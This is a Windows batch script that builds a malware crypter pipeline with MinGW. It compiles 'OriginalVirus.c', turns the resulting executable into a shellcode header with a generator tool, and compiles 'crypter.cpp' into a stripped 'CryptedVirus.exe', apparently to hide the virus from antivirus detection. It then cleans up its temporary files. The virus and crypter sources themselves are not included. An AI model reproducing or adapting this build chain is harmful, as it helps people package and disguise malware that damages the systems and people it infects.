@ECHO OFF
SET ROOTDRIVE=%SystemDrive%
SET MINGWDIR=MINGW
SET MINGWBIN=BIN
SET GCCCOMPILER=GCC.EXE
SET GPPCOMPILER=G++.EXE

SET GCC=%ROOTDRIVE%\%MINGWDIR%\%MINGWBIN%\%GCCCOMPILER%
SET GPP=%ROOTDRIVE%\%MINGWDIR%\%MINGWBIN%\%GPPCOMPILER%

ECHO GCC COMPILER = %GCC%
ECHO G++ COMPILER = %GPP%

ECHO Copy Libs To Local Path (%CD%)

COPY %ROOTDRIVE%\%MINGWDIR%\%MINGWBIN%\libgmp-10.dll %CD%
COPY %ROOTDRIVE%\%MINGWDIR%\%MINGWBIN%\libgcc_s_dw2-1.dll %CD%
COPY %ROOTDRIVE%\%MINGWDIR%\%MINGWBIN%\libmpc-3.dll %CD%
COPY %ROOTDRIVE%\%MINGWDIR%\%MINGWBIN%\libmpfr-4.dll %CD%
COPY %ROOTDRIVE%\%MINGWDIR%\%MINGWBIN%\zlib1.dll %CD%
COPY %ROOTDRIVE%\%MINGWDIR%\%MINGWBIN%\libintl-8.dll %CD%
COPY %ROOTDRIVE%\%MINGWDIR%\%MINGWBIN%\libiconv-2.dll %CD%

echo Compiling OriginalVirus.c SourceCode To OriginalVirus.Exe....
%GCC% OriginalVirus.c -o OriginalVirus.exe -lmsvcrt -luser32

echo Compiling ShellCode Generator SourceCode To ShellcodeGenerator.Exe....
%GCC% ShellcodeGenerator.c -o ShellcodeGenerator.exe -lmsvcrt

echo Converting OriginalVirus.Exe to ShellCode in ShellCode.h
ShellcodeGenerator.exe OriginalVirus.exe shellcode >shellcode.h
 
echo Building Crypted Executable....
%GPP% crypter.cpp -o CryptedVirus.exe -static -s -O5

echo Cleaning Up Temp Files...

DEL %CD%\libgmp-10.dll
DEL %CD%\libgcc_s_dw2-1.dll
DEL %CD%\libmpc-3.dll
DEL %CD%\libmpfr-4.dll
DEL %CD%\zlib1.dll
DEL %CD%\libintl-8.dll
DEL %CD%\libiconv-2.dll
DEL %CD%\ShellCode.h